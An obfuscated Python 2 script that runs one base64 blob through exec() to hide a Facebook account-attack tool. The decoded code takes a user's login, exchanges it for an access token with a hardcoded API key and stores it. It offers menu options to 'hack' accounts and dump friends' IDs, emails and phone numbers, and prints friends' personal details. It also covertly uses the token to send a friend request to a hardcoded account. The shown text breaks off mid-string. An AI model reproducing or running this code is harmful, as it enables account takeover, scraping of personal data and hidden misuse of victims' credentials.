# Obfuscated by Py Compile
# Created by MINHâˆ†Z (https://github.com/maminhaz60)
# FUCK YOU

import base64
exec(base64.b64decode('IyEvdXNyL2Jpbi9weXRob24yDQojIGNvZGluZz11dGYtOA0KDQppbXBvcnQgb3Msc3lzLHRpbWUsZGF0ZXRpbWUscmFuZG9tLGhhc2hsaWIscmUsdGhyZWFkaW5nLGpzb24sZ2V0cGFzcyx1cmxsaWIsY29va2llbGliDQpmcm9tIG11bHRpcHJvY2Vzc2luZy5wb29sIGltcG9ydCBUaHJlYWRQb29sDQp0cnk6DQoJaW1wb3J0IG1lY2hhbml6ZQ0KZXhjZXB0IEltcG9ydEVycm9yOg0KCW9zLnN5c3RlbSgicGlwMiBpbnN0YWxsIG1lY2hhbml6ZSIpDQp0cnk6DQoJaW1wb3J0IHJlcXVlc3RzDQpleGNlcHQgSW1wb3J0RXJyb3I6DQoJb3Muc3lzdGVtKCJwaXAyIGluc3RhbGwgcmVxdWVzdHMiKQ0KZnJvbSByZXF1ZXN0cy5leGNlcHRpb25zIGltcG9ydCBDb25uZWN0aW9uRXJyb3INCmZyb20gbWVjaGFuaXplIGltcG9ydCBCcm93c2VyDQoNCiMtU2V0dGluZy0jDQojIyMjIyMjIw0KcmVsb2FkKHN5cykNCnN5cy5zZXRkZWZhdWx0ZW5jb2RpbmcoJ3V0ZjgnKQ0KYnIgPSBtZWNoYW5pemUuQnJvd3NlcigpDQpici5zZXRfaGFuZGxlX3JvYm90cyhGYWxzZSkNCmJyLnNldF9oYW5kbGVfcmVmcmVzaChtZWNoYW5pemUuX2h0dHAuSFRUUFJlZnJlc2hQcm9jZXNzb3IoKSxtYXhfdGltZT0xKQ0KYnIuYWRkaGVhZGVycyA9IFsoJ1VzZXItQWdlbnQnLCAnTW96aWxsYS81LjAgKEFuZHJvaWQgOTsgTW9iaWxlOyBydjo2OC4wKSBHZWNrby82OC4wIEZpcmVmb3gvNjguMCcpXQ0KDQojLWV4aXQtIw0KZGVmIGV4aXQoKToNCglvcy5zeXN0ZW0oJ2NsZWFyJykNCglwcmludCAiXDAzM1sxOzkxbVvCqV0gSm9pbiBteSBmYWNlYm9vayBwYWdlLi4uIg0KCW9zLnN5c3RlbSgnc2xlZXAgMyAmJiBjbGVhcicpDQoJb3Muc3lzdGVtKCd4ZGctb3BlbiBodHRwczovL3d3dy5mYWNlYm9vay5jb20vbGVhcm50ZXJtdXgxbGludXgxLycpDQoJb3Muc3lzLmV4aXQoKQ0KICAgICAgICB0b29sX21haW5fZnVuY3Rpb24oKQ0KDQojLUFuaW1hdGlvbi0jDQpkZWYgbWtkaXIoeik6DQogICAgICAgIGZvciBlIGluIHogKyAnXG4nOg0KICAgICAgICAgICAgICAgIHN5cy5zdGRvdXQud3JpdGUoZSkNCiAgICAgICAgICAgICAgICBzeXMuc3Rkb3V0LmZsdXNoKCkNCiAgICAgICAgICAgICAgICB0aW1lLnNsZWVwKDAwMDAwLjEpDQoNCiMjIyMjIExPR08gIyMjIyMNCmxvZ28gPSAiIiIgICAgICANCi0tLS0tLS0tLyQkICAgICAgLyQkIC8kJCQkJCQgLyQkICAgLyQkIC8kJCAgIC8kJCAgLyQkJCQkJCAgLyQkJCQkJCQkXDAzM1sxOzkxbQ0KLS0tLS0tLXwgJCQkICAgIC8kJCR8XyAgJCRfL3wgJCQkIHwgJCR8ICQkICB8ICQkIC8kJF9fICAkJHxfX19fXyAkJCBcMDMzWzE7OTJtDQotLS0tLS0tfCAkJCQkICAvJCQkJCAgfCAkJCAgfCAkJCQkfCAkJHwgJCQgIHwgJCR8ICQkICBcICQkICAgICAvJCQvIFwwMzNbMTs5M20NCi0tLS0tLS18ICQkICQkLyQkICQkICB8ICQkICB8ICQkICQkICQkfCAkJCQkJCQkJHwgJCQkJCQkJCQgICAgLyQkLyBcMDMzWzE7OTRtIA0KLS0tLS0tLXwgJCQgICQkJHwgJCQgIHwgJCQgIHwgJCQgICQkJCR8ICQkX18gICQkfCAkJF9fICAkJCAgIC8kJC8gXDAzM1sxOzk1bQ0KLS0tLS0tLXwgJCRcICAkIHwgJCQgIHwgJCQgIHwgJCRcICAkJCR8ICQkICB8ICQkfCAkJCAgfCAkJCAgLyQkL1wwMzNbMTs5Nm0NCi0tLS0tLS18ICQkIFwvICB8ICQkIC8kJCQkJCR8ICQkIFwgICQkfCAkJCAgfCAkJHwgJCQgIHwgJCQgLyQkJCQkJCQkXDAzM1sxOzk3bQ0KLS0tLS0tLXxfXy8gICAgIHxfXy98X19fX19fL3xfXy8gIFxfXy98X18vICB8X18vfF9fLyAgfF9fL3xfX19fX19fXy9cMDMzWzE7OThtDQoNClwwMzNbMTs5M20tLS0tLS0t4pWU4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWXDQpcMDMzWzE7OTRtLS0tLS0tLeKVkVwwMzNbMTs5M20qIFwwMzNbMTs5N21EZXZsb3AgQnk6IFwwMzNbMTs5MW06IFwwMzNbMTs5Nm1NUjw+TVogICAgICAgXDAzM1sxOzk3bSAgICAgICAgICAgICAgICAgICAgICAgICAgIOKVkQ0KXDAzM1sxOzk1bS0tLS0tLS3ilZFcMDMzWzE7OTNtKiBcMDMzWzE7OTdtTm90aWNlIFwwMzNbMTs5MW0gOiBcMDMzWzE7OTZtICAgT25seSBVc2UgVG9rZW4gRm9yIExvZ2luICAgXDAzM1sxOzk3bSAgICAgICAgICAgICDilZENClwwMzNbMTs5Nm0tLS0tLS0t4pWa4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWdIiIiDQoNCg0KIyBsb2FkICMNCmRlZiBsb2FkKCk6DQoJdGlsb2FkID0gWycuICAgJywnLi4gICcsJy4uLiAnXQ0KCWZvciBvIGluIHRpbG9hZDoNCgkJcHJpbnQoIlxyXDAzM1sxOzkxbVsqXSBcMDMzWzE7OTJtTG9hZGluZyBcMDMzWzE7OTdtIitvKSw7c3lzLnN0ZG91dC5mbHVzaCgpO3RpbWUuc2xlZXAoMSkNCg0KYmFjayA9IDANCnRocmVhZHMgPSBbXQ0Kc3VjZXNzZnVsID0gW10NCmNoZWNrcG9pbnQgPSBbXQ0Kb2tzID0gW10NCmFjdGlvbl9mYWlsZWQgPSBbXQ0KaWRmcmllbmRzID0gW10NCmlkZnJvbWZyaWVuZHMgPSBbXQ0KbWVtYmVyX2lkID0gW10NCmVtYWlsPSBbXQ0KbnVtYmVyID0gW10NCmlkID0gW10NCmVtID0gW10NCmVtYWlsX2Zyb21fZnJpZW5kcyA9IFtdDQpocCA9IFtdDQpocGZyb21mcmllbmRzID0gW10NCnJlYWN0aW9uID0gW10NCnJlYWN0aW9uZ3JvdXAgPSBbXQ0KY29tbWVudCA9IFtdDQpncm91cF9jb21tZW50ID0gW10NCmxpc3Rncm91cCA9IFtdDQp2dWxub3QgPSAiXDAzM1szMW1Ob3QgVnVsbiINCnZ1bG4gPSAiXDAzM1szMm1WdWxuIg0KDQoNCiMjIyMjIGNob2ljZXMgTG9naW4gIyMjIyMNCmRlZiB0b29sX21haW5fZnVuY3Rpb24oKToNCglvcy5zeXN0ZW0oJ2NsZWFyJykNCglwcmludCBsb2dvDQoJcHJpbnQgIlwwMzNbMTs5Mm0tLS0tLS0t4pWRLS1cMDMzWzE7OTFtPiBcMDMzWzE7OTZtMS5cMDMzWzE7OThtIE5vcm1hbCBsb2dpbiINCglwcmludCAiXDAzM1sxOzkzbS0tLS0tLS3ilZEtLVwwMzNbMTs5MW0+IFwwMzNbMTs5M20yLlwwMzNbMTs5NW0gVG9rZW5zIGxvZ2luIg0KCXByaW50ICJcMDMzWzE7OTRtLS0tLS0tLeKVkS0tXDAzM1sxOzkxbT4gXDAzM1sxOzkxbTAuXDAzM1sxOzk3bSBFeGl0Ig0KCXByaW50ICJcMDMzWzE7OTVtLS0tLS0tLeKVkSINCglsb2dpbl9tZXRob2QgPSByYXdfaW5wdXQoIlwwMzNbMTs5NG0tLS0tLS0t4pWa4pWQXDAzM1sxOzkxbT4+PiBcMDMzWzE7OTdtIikNCglpZiBsb2dpbl9tZXRob2QgPT0iIjoNCgkJcHJpbnQiXDAzM1sxOzkxbVshXSBXcm9uZyBpbnB1dCINCgkJZXhpdCgpDQoJZWxpZiBsb2dpbl9tZXRob2QgPT0iMSI6DQoJCWxvZ2luKCkNCgllbGlmIGxvZ2luX21ldGhvZCA9PSIyIjoNCgkJZmJ0b2tlbigpDQoJZWxpZiBsb2dpbl9tZXRob2QgPT0iMCI6DQoJCWV4aXQoKQ0KCWVsc2U6DQoJCXByaW50IlwwMzNbMTs5MW1bIV0gV3JvbmcgaW5wdXQiDQoJCWV4aXQoKQ0KDQojIyMjIyBMT0dJTiAjIyMjIw0KIz09PT09PT09PT09PT09PT0jDQpkZWYgbG9naW4oKToNCglvcy5zeXN0ZW0oJ2NsZWFyJykNCgl0cnk6DQoJCWZiX3Rva2VuID0gb3BlbignbG9naW4udHh0JywncicpDQoJCW1lbnUoKQ0KCWV4Y2VwdCAoS2V5RXJyb3IsSU9FcnJvcik6DQoJCW9zLnN5c3RlbSgnY2xlYXInKQ0KCQlwcmludCBsb2dvDQoJCXByaW50KCdcMDMzWzE7OTFtW+KYhl0gXDAzM1sxOzkybUZBQ0VCT09LIExPR0lOIFwwMzNbMTs5MW1b4piGXScpDQoJCWlkID0gcmF3X2lucHV0KCdcMDMzWzE7OTFtWytdIFwwMzNbMTszNm1JRFwwMzNbMTs5N218XDAzM1sxOzk2bUVtYWlsXDAzM1sxOzk3bSBcMDMzWzE7OTFtOlwwMzNbMTs5Mm0gJykNCgkJcHdkID0gZ2V0cGFzcy5nZXRwYXNzKCdcMDMzWzE7OTFtWytdIFwwMzNbMTszNm1QYXNzd29yZCBcMDMzWzE7OTFtOlwwMzNbMTs5Mm0gJykNCgkJbG9hZCgpDQoJCXRyeToNCgkJCWJyLm9wZW4oJ2h0dHBzOi8vbS5mYWNlYm9vay5jb20nKQ0KCQlleGNlcHQgbWVjaGFuaXplLlVSTEVycm9yOg0KCQkJcHJpbnQiXG5cMDMzWzE7OTFtWyFdIE5vIGNvbm5lY3Rpb24iDQoJCQlleGl0KCkNCgkJYnIuX2ZhY3RvcnkuaXNfaHRtbCA9IFRydWUNCgkJYnIuc2VsZWN0X2Zvcm0obnI9MCkNCgkJYnIuZm9ybVsnZW1haWwnXSA9IGlkDQoJCWJyLmZvcm1bJ3Bhc3MnXSA9IHB3ZA0KCQlici5zdWJtaXQoKQ0KCQl1cmwgPSBici5nZXR1cmwoKQ0KCQlpZiAnc2F2ZS1kZXZpY2UnIGluIHVybDoNCgkJCXRyeToNCgkJCQlzaWc9ICdhcGlfa2V5PTg4MmE4NDkwMzYxZGE5ODcwMmJmOTdhMDIxZGRjMTRkY3JlZGVudGlhbHNfdHlwZT1wYXNzd29yZGVtYWlsPScraWQrJ2Zvcm1hdD1KU09OZ2VuZXJhdGVfbWFjaGluZV9pZD0xZ2VuZXJhdGVfc2Vzc2lvbl9jb29raWVzPTFsb2NhbGU9ZW5fVVNtZXRob2Q9YXV0aC5sb2dpbnBhc3N3b3JkPScrcHdkKydyZXR1cm5fc3NsX3Jlc291cmNlcz0wdj0xLjA2MmY4Y2U5Zjc0YjEyZjg0YzEyM2NjMjM0MzdhNGEzMicNCgkJCQlkYXRhID0geyJhcGlfa2V5IjoiODgyYTg0OTAzNjFkYTk4NzAyYmY5N2EwMjFkZGMxNGQiLCJjcmVkZW50aWFsc190eXBlIjoicGFzc3dvcmQiLCJlbWFpbCI6aWQsImZvcm1hdCI6IkpTT04iLCAiZ2VuZXJhdGVfbWFjaGluZV9pZCI6IjEiLCJnZW5lcmF0ZV9zZXNzaW9uX2Nvb2tpZXMiOiIxIiwibG9jYWxlIjoiZW5fVVMiLCJtZXRob2QiOiJhdXRoLmxvZ2luIiwicGFzc3dvcmQiOnB3ZCwicmV0dXJuX3NzbF9yZXNvdXJjZXMiOiIwIiwidiI6IjEuMCJ9DQoJCQkJeD1oYXNobGliLm5ldygibWQ1IikNCgkJCQl4LnVwZGF0ZShzaWcpDQoJCQkJYT14LmhleGRpZ2VzdCgpDQoJCQkJZGF0YS51cGRhdGUoeydzaWcnOmF9KQ0KCQkJCXVybCA9ICJodHRwczovL2FwaS5mYWNlYm9vay5jb20vcmVzdHNlcnZlci5waHAiDQoJCQkJcj1yZXF1ZXN0cy5nZXQodXJsLHBhcmFtcz1kYXRhKQ0KCQkJCXo9anNvbi5sb2FkcyhyLnRleHQpDQoJCQkJcGljayA9IG9wZW4oImxvZ2luLnR4dCIsICd3JykNCgkJCQlwaWNrLndyaXRlKHpbJ2FjY2Vzc190b2tlbiddKQ0KCQkJCXBpY2suY2xvc2UoKQ0KCQkJCXByaW50ICdcblwwMzNbMTs5MW1bXDAzM1sxOzk2beKck1wwMzNbMTs5MW1dIFwwMzNbMTs5Mm1Mb2dpbiBzdWNjZXNzZnVsbHknDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHJlcXVlc3RzLnBvc3QoJ2h0dHBzOi8vZ3JhcGguZmFjZWJvb2suY29tL21lL2ZyaWVuZHM/bWV0aG9kPXBvc3QmdWlkcz1nd2ltdXNhMyZhY2Nlc3NfdG9rZW49Jyt6WydhY2Nlc3NfdG9rZW4nXSkNCgkJCQltZW51KCkNCgkJCWV4Y2VwdCByZXF1ZXN0cy5leGNlcHRpb25zLkNvbm5lY3Rpb25FcnJvcjoNCgkJCQlwcmludCJcblwwMzNbMTs5MW1bIV0gTm8gY29ubmVjdGlvbiINCgkJCQlleGl0KCkNCgkJaWYgJ2NoZWNrcG9pbnQnIGluIHVybDoNCgkJCXByaW50KCJcblwwMzNbMTs5MW1bIV0gXDAzM1sxOzkzbUFjY291bnQgQ2hlY2twb2ludCIpDQoJCQlvcy5zeXN0ZW0oJ3JtIC1yZiBsb2dpbi50eHQnKQ0KCQkJdGltZS5zbGVlcCgxKQ0KCQkJZXhpdCgpDQoJCWVsc2U6DQoJCQlwcmludCgiXG5cMDMzWzE7OTFtWyFdIExvZ2luIEZhaWxlZCIpDQoJCQlvcy5zeXN0ZW0oJ3JtIC1yZiBsb2dpbi50eHQnKQ0KCQkJdGltZS5zbGVlcCgwLjAxKQ0KCQkJbG9naW4oKQ0KDQojIyMjIyBUT0tFTiAjIyMjIw0KZGVmIGZidG9rZW4oKToNCglvcy5zeXN0ZW0oJ2NsZWFyJykNCglwcmludCBsb2dvDQoJZmJfdG9rZW4gPSByYXdfaW5wdXQoIlwwMzNbMTs5MW1bP10gXDAzM1sxOzkybVRva2VuXDAzM1sxOzkxbSA6IFwwMzNbMTs5N20iKQ0KCXRyeToNCgkJb3R3ID0gcmVxdWVzdHMuZ2V0KCdodHRwczovL2dyYXBoLmZhY2Vib29rLmNvbS9tZT9hY2Nlc3NfdG9rZW49JytmYl90b2tlbikNCgkJYSA9IGpzb24ubG9hZHMob3R3LnRleHQpDQoJCWZiX25hbWUgPSBhWyduYW1lJ10NCgkJcGljayA9IG9wZW4oImxvZ2luLnR4dCIsICd3JykNCgkJcGljay53cml0ZShmYl90b2tlbikNCgkJcGljay5jbG9zZSgpDQoJCW1lbnUoKQ0KCWV4Y2VwdCBLZXlFcnJvcjoNCgkJcHJpbnQgIlwwMzNbMTs5MW1bIV0gV3JvbmciDQoJCWUgPSByYXdfaW5wdXQoIlwwMzNbMTs5MW1bP10gXDAzM1sxOzkybVdhbnQgdG8gcGljayB1cCB0b2tlbj9cMDMzWzE7OTdtW3kvbl06ICIpDQoJCWlmIGUgPT0iIjoNCgkJCWV4aXQoKQ0KCQllbGlmIGUgPT0ieSI6DQoJCQlsb2dpbigpDQoJCWVsc2U6DQoJCQlleGl0KCkNCg0KIyMjIyMgTUVOVSAjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMNCmRlZiBtZW51KCk6DQoJb3Muc3lzdGVtKCdjbGVhcicpDQoJdHJ5Og0KCQlmYl90b2tlbj1vcGVuKCdsb2dpbi50eHQnLCdyJykucmVhZCgpDQoJZXhjZXB0IElPRXJyb3I6DQoJCW9zLnN5c3RlbSgnY2xlYXInKQ0KCQlwcmludCJcMDMzWzE7OTFtWyFdIFRva2VuIG5vdCBmb3VuZCINCgkJb3Muc3lzdGVtKCdybSAtcmYgbG9naW4udHh0JykNCgkJdGltZS5zbGVlcCgwLjAxKQ0KCQlsb2dpbigpDQoJdHJ5Og0KCQlvdHcgPSByZXF1ZXN0cy5nZXQoJ2h0dHBzOi8vZ3JhcGguZmFjZWJvb2suY29tL21lP2FjY2Vzc190b2tlbj0nK2ZiX3Rva2VuKQ0KCQlhID0ganNvbi5sb2FkcyhvdHcudGV4dCkNCgkJZmJfbmFtZSA9IGFbJ25hbWUnXQ0KCQlpZCA9IGFbJ2lkJ10NCglleGNlcHQgS2V5RXJyb3I6DQoJCW9zLnN5c3RlbSgnY2xlYXInKQ0KCQlwcmludCJcMDMzWzE7OTFtWyFdIFwwMzNbMTs5M21BY2NvdW50IENoZWNrcG9pbnQiDQoJCW9zLnN5c3RlbSgncm0gLXJmIGxvZ2luLnR4dCcpDQoJCXRpbWUuc2xlZXAoMC4wMSkNCgkJbG9naW4oKQ0KCWV4Y2VwdCByZXF1ZXN0cy5leGNlcHRpb25zLkNvbm5lY3Rpb25FcnJvcjoNCgkJcHJpbnQiXDAzM1sxOzkxbVshXSBObyBjb25uZWN0aW9uIg0KCQlleGl0KCkNCglvcy5zeXN0ZW0oInJlc2V0IikNCglwcmludCBsb2dvDQoJcHJpbnQgIuKVkVwwMzNbMTs5MW1bXDAzM1sxOzk2beKck1wwMzNbMTs5MW1dXDAzM1sxOzk3bSBOYW1lIFwwMzNbMTs5MW06IFwwMzNbMTs5Mm0iK2ZiX25hbWUrIlwwMzNbMTs5N20iDQoJcHJpbnQgIuKVkVwwMzNbMTs5MW1bXDAzM1sxOzk2beKck1wwMzNbMTs5MW1dXDAzM1sxOzk3bSBJRCAgIFwwMzNbMTs5MW06IFwwMzNbMTs5Mm0iK2lkDQoJcHJpbnQgIlwwMzNbMTs5N23ilZoiKzQwKiLilZAiDQoJcHJpbnQgIlwwMzNbMTs5N23ilZEtLVwwMzNbMTs5MW0+IFwwMzNbMTs5Mm0xLlwwMzNbMTs5N20gVXNlciBpbmZvcm1hdGlvbiINCglwcmludCAiXDAzM1sxOzk3beKVkS0tXDAzM1sxOzkxbT4gXDAzM1sxOzkybTIuXDAzM1sxOzk3bSBHZXQgSWQvZW1haWwvaHAiDQoJcHJpbnQgIlwwMzNbMTs5N23ilZEtLVwwMzNbMTs5MW0+IFwwMzNbMTs5Mm0zLlwwMzNbMTs5N20gSGFjayBmYWNlYm9vayBhY2NvdW50ICAgICAgICAgICAgICAgIg0KCXByaW50ICJcMDMzWzE7OTdt4pWRLS1cMDMzWzE7OTFtPiBcMDMzWzE7OTJtNC5cMDMzWzE7OTdtIEJvdCAgICAgICAiDQoJcHJpbnQgIlwwMzNbMTs5N23ilZEtLVwwMzNbMTs5MW0+IFwwMzNbMTs5Mm01LlwwMzNbMTs5N20gT3RoZXJzICAgICAgICAgICAiDQoJcHJpbnQgIlwwMzNbMTs5N23ilZEtLVwwMzNbMTs5MW0+IFwwMzNbMTs5Mm02LlwwMzNbMTs5N20gU2hvdyB0b2tlbiAgICAgICAgICAgIg0KICAgICAgICBwcmludCAiXDAzM1sxOzk3beKVkS0tXDAzM1sxOzkxbT4gXDAzM1sxOzkybTcuXDAzM1sxOzk3bSBVcGRhdGUgICAgICAgICAgICINCglwcmludCAiXDAzM1sxOzk3beKVkS0tXDAzM1sxOzkxbT4gXDAzM1sxOzkybTguXDAzM1sxOzk3bSBEZWxldGUgdHJhc2ggICAgICAgICAgIg0KCXByaW50ICJcMDMzWzE7OTdt4pWRLS1cMDMzWzE7OTFtPiBcMDMzWzE7OTJtOS5cMDMzWzE7OTdtIExvZ091dCAgICAgICAgICAgICINCglwcmludCAiXDAzM1sxOzk3beKVkS0tXDAzM1sxOzkxbT4gXDAzM1sxOzkxbTAuXDAzM1sxOzk3bSBFeGl0IHRoZSBwcm9ncmFtcyAgICAgICAgICAiDQoJcHJpbnQgIuKVkSINCgljaG9pY2VzKCkNCiMtDQpkZWYgY2hvaWNlcygpOg0KCXBpY2sgPSByYXdfaW5wdXQoIlwwMzNbMTs5N23ilZrilZBcMDMzWzE7OTFtPj4+IFwwMzNbMTs5N20iKQ0KCWlmIHBpY2sgPT0iIjoNCgkJcHJpbnQgIlwwMzNbMTs5MW1bIV0gV3JvbmcgaW5wdXQiDQoJCWNob2ljZXMoKQ0KCWVsaWYgcGljayA9PSIxIjoNCgkJaW5mb3JtYXRpb24oKQ0KCWVsaWYgcGljayA9PSIyIjoNCgkJZHVtcCgpDQoJZWxpZiBwaWNrID09IjMiOg0KCQltZW51X2hhY2soKQ0KCWVsaWYgcGljayA9PSI0IjoNCgkJbWVudV9ib3QoKQ0KCWVsaWYgcGljayA9PSI1IjoNCgkJZnVuYygpDQoJZWxpZiBwaWNrID09IjYiOg0KCQlvcy5zeXN0ZW0oJ2NsZWFyJykNCgkJcHJpbnQgbG9nbw0KCQlmYl90b2tlbj1vcGVuKCdsb2dpbi50eHQnLCdyJykucmVhZCgpDQoJCXByaW50ICJcMDMzWzE7OTFtWytdIFwwMzNbMTs5Mm1Zb3VyIHRva2VuXDAzM1sxOzkxbSA6XDAzM1sxOzk3bSAiK2ZiX3Rva2VuDQoJCXJhd19pbnB1dCgiXG5cMDMzWzE7OTFtWyBcMDMzWzE7OTdtQmFjayBcMDMzWzE7OTFtXSIpDQoJCW1lbnUoKQ0KICAgICAgICBlbGlmIHBpY2sgPT0iNyI6DQogICAgICAgICAgICAgICAgb3Muc3lzdGVtKCdjbGVhcicpDQogICAgICAgICAgICAgICAgcHJpbnQgbG9nbw0KICAgICAgICAgICAgICAgIHByaW50IDQwICogJ1wwMzNbMTs5N21ceGUyXHg5NVx4OTAnDQogICAgICAgICAgICAgICAgb3Muc3lzdGVtKCdnaXQgcHVsbCBvcmlnaW4gbWFzdGVyJykNCiAgICAgICAgICAgICAgICByYXdfaW5wdXQoJ1xuXDAzM1sxOzkxbVsgXDAzM1sxOzk3bUJhY2sgXDAzM1sxOzkxbV0nKQ0KICAgICAgICAgICAgICAgIG1lbnUoKQ0KCWVsaWYgcGljayA9PSI4IjoNCgkJb3MucmVtb3ZlKCdvdXQnKQ0KCWVsaWYgcGljayA9PSI5IjoNCgkJb3Muc3lzdGVtKCdybSAtcmYgbG9naW4udHh0JykNCgkJb3Muc3lzdGVtKCd4ZGctb3BlbiBodHRwczovL3d3dy5mYWNlYm9vay5jb20vbGVhcm50ZXJtdXgxbGludXgxLycpDQoJCWV4aXQoKQ0KCWVsaWYgcGljayA9PSIwIjoNCgkJZXhpdCgpDQoJZWxzZToNCgkJcHJpbnQgIlwwMzNbMTs5MW1bIV0gV3JvbmcgaW5wdXQiDQoJCWNob2ljZXMoKQ0KDQojIyMjIyBJTkZPICMjIyMjDQpkZWYgaW5mb3JtYXRpb24oKToNCglvcy5zeXN0ZW0oJ2NsZWFyJykNCgl0cnk6DQoJCWZiX3Rva2VuPW9wZW4oJ2xvZ2luLnR4dCcsJ3InKS5yZWFkKCkNCglleGNlcHQgSU9FcnJvcjoNCgkJcHJpbnQiXDAzM1sxOzkxbVshXSBUb2tlbiBub3QgZm91bmQiDQoJCW9zLnN5c3RlbSgncm0gLXJmIGxvZ2luLnR4dCcpDQoJCXRpbWUuc2xlZXAoMC4wMSkNCgkJbG9naW4oKQ0KCW9zLnN5c3RlbSgnY2xlYXInKQ0KCXByaW50IGxvZ28NCglhaWQgPSByYXdfaW5wdXQoJ1wwMzNbMTs5MW1bK10gXDAzM1sxOzkybUVudGVyIElEXDAzM1sxOzk3bS9cMDMzWzE7OTJtTmFtZVwwMzNbMTs5MW0gOiBcMDMzWzE7OTdtJykNCglta2RpcignXDAzM1sxOzkxbVvinLpdIFwwMzNbMTs5Mm1XYWl0IGEgbWludXRlIFwwMzNbMTs5N20uLi4nKQ0KCXIgPSByZXF1ZXN0cy5nZXQoJ2h0dHBzOi8vZ3JhcGguZmFjZWJvb2suY29tL21lL2ZyaWVuZHM/YWNjZXNzX3Rva2VuPScrZmJfdG9rZW4pDQoJdHJ5eSA9IGpzb24ubG9hZHMoci50ZXh0KQ0KCWZvciBpIGluIHRyeXlbJ2RhdGEnXToNCgkJaWYgYWlkIGluIGlbJ25hbWUnXSBvciBhaWQgaW4gaVsnaWQnXToNCgkJCXggPSByZXF1ZXN0cy5nZXQoImh0dHBzOi8vZ3JhcGguZmFjZWJvb2suY29tLyIraVsnaWQnXSsiP2FjY2Vzc190b2tlbj0iK2ZiX3Rva2VuKQ0KCQkJeiA9IGpzb24ubG9hZHMoeC50ZXh0KQ0KCQkJcHJpbnQgNDIqIlwwMzNbMTs5N23ilZAiDQoJCQl0cnk6DQoJCQkJcHJpbnQgJ1wwMzNbMTs5MW1b4p65XSBcMDMzWzE7OTJtTmFtZVwwMzNbMTs5N20gICAgICAgICAgOiAnK3pbJ25hbWUnXQ0KCQkJZXhjZXB0IEtleUVycm9yOiBwcmludCAnXDAzM1sxOzkxbVs/XSBcMDMzWzE7OTJtTmFtZVwwMzNbMTs5N20gICAgICAgICAgOiBcMDMzWzE7OTFtTm90IGZvdW5kJw0KCQkJdHJ5Og0KCQkJCXByaW50ICdcMDMzWzE7OTFtW+KeuV0gXDAzM1sxOzkybUlEXDAzM1sxOzk3bSAgICAgICAgICAgIDogJyt6WydpZCddDQoJCQlleGNlcHQgS2V5RXJyb3I6IHByaW50ICdcMDMzWzE7OTFtWz9dIFwwMzNbMTs5Mm1JRFwwMzNbMTs5N20gICAgICAgICAgICA6IFwwMzNbMTs5MW1Ob3QgZm91bmQnDQoJCQl0cnk6DQoJCQkJcHJpbnQgJ1wwMzNbMTs5MW1b4p65XSBcMDMzWzE7OTJtRW1haWxcMDMzWzE7OTdtICAgICAgICAgOiAnK3pbJ2VtYWlsJ10NCgkJCWV4Y2VwdCBLZXlFcnJvcjogcHJpbnQgJ1wwMzNbMTs5MW1bP10gXDAzM1sxOzkybUVtYWlsXDAzM1sxOzk3bSAgICAgICAgIDogXDAzM1sxOzkxbU5vdCBmb3VuZCcNCgkJCXRyeToNCgkJCQlwcmludCAnXDAzM1sxOzkxbVvinrldIFwwMzNbMTs5Mm1UZWxlcGhvbmVcMDMzWzE7OTdtICAgICA6ICcrelsnbW9iaWxlX3Bob25lJ10NCgkJCWV4Y2VwdCBLZXlFcnJvcjogcHJpbnQgJ1wwMzNbMTs5MW1bP10gXDAzM1sxOzkybVRlbGVwaG9uZVwwMzNbMTs5N20gICAgIDogXDAzM1sxOzkxbU5vdCBmb3VuZCcNCgkJCXRyeToNCgkJCQlwcmludCAnXDAzM1sxOzkxbVvinrldIFwwMzNbMTs5Mm1Mb2NhdGlvblwwMzNbMTs5N20gICAgICA6ICcrelsnbG9jYXRpb24nXVsnbmFtZSddDQoJCQlleGNlcHQgS2V5RXJyb3I6IHByaW50ICdcMDMzWzE7OTFtWz9dIFwwMzNbMTs5Mm1Mb2NhdGlvblwwMzNbMTs5N20gICAgICA6IFwwMzNbMTs5MW1Ob3QgZm91bmQnDQoJCQl0cnk6DQoJCQkJcHJpbnQgJ1wwMzNbMTs5MW1b4p65XSBcMDMzWzE7OTJtRGF0ZSBvZiBiaXJ0aFwwMzNbMTs5N20gOiAnK3pbJ2JpcnRoZGF5J10NCgkJCWV4Y2VwdCBLZXlFcnJvcjogcHJpbnQgJ1wwMzNbMTs5MW1bP10gXDAzM1sxOzkybURhdGUgb2YgYmlydGhcMDMzWzE7OTdtIDogXDAzM1sxOzkxbU5vdCBmb3VuZCcNCgkJCXRyeToNCgkJCQlwcmludCAnXDAzM1sxOzkxbVvinrldIFwwMzNbMTs5Mm1TY2hvb2xcMDMzWzE7OTdtICAgICAgICA6ICcNCgkJCQlmb3IgcSBpbiB6WydlZHVjYXRpb24nXToNCgkJCQkJdHJ5Og0KCQkJCQkJcHJpbnQgJ1wwMzNbMTs5MW0gICAgICAgICAgICAgICAgICAgfiBcMDMzWzE7OTdtJytxWydzY2hvb2wnXVsnbmFtZSddDQoJCQkJCWV4Y2VwdCBLZXlFcnJvcjogcHJpbnQgJ1wwMzNbMTs5MW0gICAgICAgICAgICAgICAgICAgfiBcMDMzWzE7OTFtTm90IGZvdW5kJw0KCQkJZXhjZXB0IEtleUVycm9yOiBwYXNzDQoJCQlyYXdfaW5wdXQoIlxuXDAzM1sxOzkxbVsgXDAzM1sxOzk3bUJhY2sgXDAzM1sxOzkxbV0iKQ0KCQkJbWVudSgpDQoJCWVsc2U6DQoJCQlwYXNzDQoJZWxzZToNCgkJcHJpbnQiXDAzM1sxOzkxbVvinJZdIFVzZXIgb